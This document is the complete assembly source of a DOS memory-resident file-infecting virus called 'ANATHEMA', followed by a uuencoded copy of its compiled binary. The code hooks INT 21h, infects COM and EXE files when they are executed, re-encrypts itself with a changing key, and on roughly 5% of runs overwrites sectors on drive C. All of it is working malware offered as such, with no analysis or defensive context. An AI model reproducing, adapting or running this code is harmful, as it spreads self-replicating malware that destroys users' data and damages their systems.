; ANATH.ASM by THE STRANGER
; activates 5% of times run, then trashes 2 random sectors
; this is a tsr virus
;
;
.model tiny                             ; Handy directive
.code                                   ; Virus code segment
          org    0                      ; For easy calculation of offsets
id = '�X'                               ; ID word for EXE infections

startvirus:
decrypt:                                ; handles encryption and decryption
patch_startencrypt:
          mov  bp,offset startencrypt   ; start of decryption
          mov  ax,(offset heap - offset startencrypt)/2 ; iterations
decrypt_loop:
          db   2eh,81h,46h,0            ; add word ptr cs:[bp], xxxx
decrypt_value dw  0                     ; initialised at zero for null effect
          inc  bp                       ; calculate new decryption location
          inc  bp
          dec  ax                       ; If we are not done, then
          jnz  decrypt_loop             ; decrypt mo'
startencrypt:
          call next                     ; calculate delta offset
next:     pop  bp                       ; bp = IP next
          sub  bp,offset next           ; bp = delta offset

          push ds
          push es

          mov  ax,'EB'                  ; Installation check
          int  21h
          cmp  ax,'TU'                  ; Already installed?
          jz  done_install

          mov  ax, es                   ; Get PSP
          dec  ax
          mov  ds, ax                   ; Get MCB

          sub  word ptr ds:[3],((endheap-startvirus+1023)/1024)*64
          sub  word ptr ds:[12h],((endheap-startvirus+1023)/1024)*64
          mov  es,word ptr ds:[12h]

          push cs
          pop  ds
          xor  di,di                    ; Destination
          mov  cx,(heap-startvirus)/2+1 ; Bytes to zopy
          mov  si,bp                    ; lea  si,[bp+offset startvirus]
          rep  movsw

          mov  di,offset encrypt
          mov  si,bp                    ; lea  si,[bp+offset startvirus]
          mov  cx,startencrypt-decrypt
          rep  movsb
          mov  al,0c3h                  ; retn
          stosb

          xor  ax,ax
          mov  ds,ax
          sub  word ptr ds:[413h],(endheap-startvirus+1023)/1024
          push ds
          lds  ax,ds:[21h*4]            ; Get old int handler
          mov  word ptr es:oldint21, ax
          mov  word ptr es:oldint21+2, ds
          pop  ds
          mov  word ptr ds:[21h*4], offset int21 ; Replace with new handler
          mov  ds:[21h*4+2], es         ; in high memory
done_install:
          mov  ah,2ch                   ; Get current time
          int  21h
          cmp  dl,6                     ; Check the percentage
      jb activate
exit_virus:
          pop  es
          pop  ds
          cmp  sp,id                    ; EXE or COM?
          jz   returnEXE
returnCOM:
          lea  si,[bp+offset save3]
          mov  di,100h
          push di                       ; For later return
          movsw
          movsb
          retn                          ; 100h is on stack
returnEXE:
          mov  ax,es                    ; AX = PSP segment
          add  ax,10h                   ; Adjust for PSP
          add  word ptr cs:[bp+oldCSIP+2],ax
          add  ax,word ptr cs:[bp+oldSSSP+2]
          cli                           ; Clear intrpts for stack manipulation
          mov  sp,word ptr cs:[bp+oldSSSP]
          mov  ss,ax
          sti
          db   0eah                     ; jmp ssss:oooo
oldCSIP   db ?                          ; Original CS:IP (4 bytes)
save3     db 0cdh,20h,0                 ; First 3 bytes of COM file
oldSSSP   dd ?                          ; Original SS:SP

activate:                               ; Conditions satisfied
                    ; trash a random sector 
        mov  ah,2ch                     ; Get current time
        int  21h            ; dl holds random sector
    mov al,02h          ; drive c
    mov dh,00
    mov cx,0002h            ; 2 sectors
    int 26h             ; trash them
    popf                ; clean up stack

          jmp  exit_virus

virus     db '[ANATHEMA]',0
author    db 'THE STRANGER',0

int21:                                  ; New interrupt handler
          cmp  ax,'EB'                  ; Installation check?
          jnz  notinstall
          mov  ax,'TU'
          iret
notinstall:
          pushf
          push ax
          push bx
          push cx
          push dx
          push si
          push di                       ; don't need to save bp
          push ds
          push es
          cmp  ax,4b00h                 ; Infect on execute
          jz   infectDSDX
exithandler:
          pop  es
          pop  ds
          pop  di
          pop  si
          pop  dx
          pop  cx
          pop  bx
          pop  ax
          popf
          db 0eah                       ; JMP SSSS:OOOO
oldint21  dd ?                          ; Go to orig handler

infectDSDX:
          mov  ax,4300h
          int  21h
          push ds
          push dx
          push cx                       ; Save attributes
          xor  cx,cx                    ; Clear attributes
          call attributes               ; Set file attributes

          mov  ax,3d02h                 ; Open read/write
          int  21h
          xchg ax,bx

          mov  ax,5700h                 ; Get creation date/time
          int  21h
          push cx                       ; Save date and
          push dx                       ; time

          push cs                       ; DS = CS
          pop  ds
          push cs                       ; ES = CS
          pop  es
          mov  ah,3fh                   ; Read file to buffer
          mov  dx,offset buffer         ; @ DS:DX
          mov  cx,1Ah                   ; 1Ah bytes
          int  21h

          mov  ax,4202h                 ; Go to end of file
          xor  cx,cx
          cwd
          int  21h

          mov  word ptr filesize,ax
          mov  word ptr filesize+2,dx
          cmp  word ptr buffer,'ZM'     ; EXE?
          jz   checkEXE                 ; Why yes, yes it is!
checkCOM:
          mov  ax,word ptr filesize
          cmp  ax,65535-(endheap-decrypt) ; Is it too large?
          ja   done_file

          mov  cx,word ptr buffer+1     ; get jmp location
          add  cx,heap-startvirus+3     ; Adjust for virus size
          cmp  ax,cx                    ; Already infected?
          je   done_file
          jmp  infect_com
checkEXE:
          cmp  word ptr buffer+10h,id   ; is it already infected?
          jnz  infect_exe
done_file:
          mov  ax,5701h                 ; Restore creation date/time
          pop  dx                       ; Restore date and
          pop  cx                       ; time
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          pop  cx
          pop  dx
          pop  ds                       ; Restore filename
          call attributes               ; attributes

          jmp  exithandler
infect_exe:
          mov  cx, 1ah
          push cx
          push bx                       ; Save file handle
          les  ax,dword ptr buffer+14h  ; Save old entry point
          mov  word ptr oldCSIP, ax
          mov  word ptr oldCSIP+2, es

          les  ax,dword ptr buffer+0Eh  ; Save old stack
          mov  word ptr oldSSSP,es
          mov  word ptr oldSSSP+2,ax

          mov  ax,word ptr buffer+8     ; Get header size
          mov  cl, 4                    ; convert to bytes
          shl  ax, cl
          xchg ax, bx

          les  ax,dword ptr filesize    ; Get file size
          mov  dx, es                   ; to DX:AX
          push ax
          push dx

          sub  ax, bx                   ; Subtract header size from
          sbb  dx, 0                    ; file size

          mov  cx, 10h                  ; Convert to segment:offset
          div  cx                       ; form

          mov  word ptr buffer+14h, dx  ; New entry point
          mov  word ptr buffer+16h, ax

          mov  word ptr buffer+0Eh, ax  ; and stack
          mov  word ptr buffer+10h, id

          pop  dx                       ; get file length
          pop  ax
          pop  bx                       ; Restore file handle

          add  ax, heap-startvirus      ; add virus size
          adc  dx, 0

          mov  cl, 9
          push ax
          shr  ax, cl
          ror  dx, cl
          stc
          adc  dx, ax
          pop  ax
          and  ah, 1                    ; mod 512

          mov  word ptr buffer+4, dx    ; new file size
          mov  word ptr buffer+2, ax

          push cs                       ; restore ES
          pop  es

          mov  ax,word ptr buffer+14h   ; needed later
          jmp  short finishinfection
infect_com:                             ; ax = filesize
          mov  cx,3
          push cx
          sub  ax,cx
          mov  si,offset buffer
          mov  di,offset save3
          movsw
          movsb
          mov  byte ptr [si-3],0e9h
          mov  word ptr [si-2],ax
          add  ax,103h
finishinfection:
          add  ax,offset startencrypt-offset decrypt
          mov  word ptr encrypt+(patch_startencrypt-startvirus)+1,ax

          mov  ah,2ch                   ; Get current time
          int  21h                      ; dh=sec,dl=1/100 sec
          mov  word ptr encrypt+(decrypt_value-startvirus),dx ; New encrypt. value
          xor  byte ptr encrypt+(decrypt_loop-startvirus)+2,028h ; flip between add/sub

          xor  si,si                    ; copy virus to buffer
          mov  di,offset zopystuff
          mov  cx,heap-startvirus
          rep  movsb

          mov  si,offset encrypt        ; copy encryption function
          mov  di,offset zopystuff
          mov  cx,startencrypt-decrypt
          rep  movsb

          xor  byte ptr zopystuff+(decrypt_loop-startvirus)+2,028h ; flip between add/sub

          mov  word ptr [encrypt+(patch_startencrypt-startvirus)+1],offset zopystuff+(startencrypt-decrypt)

          push bp
          call encrypt
          pop  bp

          mov  ah,40h                   ; Concatenate virus
          mov  dx,offset zopystuff
          mov  cx,heap-startvirus       ; # bytes to write
          int  21h

          mov  ax,4200h                 ; Move file pointer
          xor  cx,cx                    ; to beginning of file
          cwd                           ; xor dx,dx
          int  21h

          mov  ah,40h                   ; Write to file
          mov  dx,offset buffer         ; Write from buffer
          pop  cx                       ; cx bytes
          int  21h

          jmp  done_file

attributes:
          mov  ax,4301h                 ; Set attributes to cx
          int  21h
          ret

heap:                                   ; Variables not in code
filesize  dd ?
encrypt:  db startencrypt-decrypt+1 dup (?)
zopystuff db heap-startvirus dup (?)    ; Encryption buffer
buffer    db 1ah dup (?)                ; read buffer
endheap:                                ; End of virus
end       startvirus
begin 775 anath.com
MO1$`N!X!+H%&````145(=?7H``!=@>T4`!X&N$)%S2$]551T4(S`2([8@2X#
M`(``@2X2`(``C@82``X?,_^Y)P&+]?.EOU$"B_6Y$0#SI+##JC/`CMB#+A,$
M`I`>Q0:$`":C^P`FC![]`!_'!H0`V@",!H8`M"S-(8#Z!G(T!Q^!_%C]=`N-
MMJL`OP`!5Z6DPXS`!1``+@&&K``N`X:P`/HNBZ:N`([0^^H`S2```````+0L
MS2&P`K8`N0(`S2:=Z[Q;04Y!5$A%34%=`%1(12!35%)!3D=%4@`]0D5U!+A5
M5,^<4%-14E97'@8]`$MT#@H`````N`!#S2$>4E$SR>@[`;@"
M/+#K$$@<%0`CO!=`OIA0"!/L`$6/UU$[@!5UI9S2&T/LTA
M65H?Z-D`ZX&Y&@!14\0&Q`2CJ@",!JP`Q`:^!(P&K@"CL`"AN`2Q!-/@D\0&
M30*,PE!2*\.#V@"Y$`#W\8D6Q`2CQ@2CO@3'!L`$6/U:6%L%30*#T@"Q"5#3
MZ-/*^1/06(#D`8D6M`2CL@0.!Z'$!.L8N0,`42O!OK`$OZL`I:3&1/WIB43^
M!0,!!1$`HU("M"S-(8D66P*`-ED"*#/VOV,"N4T"\Z2^40*_8P*Y$0#SI(`V
M:P(HQP92`G0"5>@H`%VT0+IC`KE-`LTAN`!",\F9S2&T0+JP!%G-(>D6_[@!
$0\TAPP``
`
end